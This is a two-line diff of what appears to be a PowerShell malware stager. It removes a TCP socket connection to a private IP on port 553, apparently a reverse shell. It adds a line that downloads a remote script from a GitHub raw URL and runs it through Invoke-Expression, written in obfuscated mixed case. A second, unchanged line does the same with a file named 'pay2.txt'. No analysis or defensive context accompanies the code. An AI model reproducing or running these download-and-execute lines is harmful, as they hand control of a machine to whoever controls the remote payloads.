@@ -1,2 +1,2 @@
-$client = New-Object System.Net.Sockets.TCPClient('192.168.0.122',553);
+(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/haycurt/VPSSTUFF/master/client') | iNvokE-EXPresSIOn
 (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/haycurt/VPSSTUFF/master/pay2.txt') | iNvokE-EXPresSIon
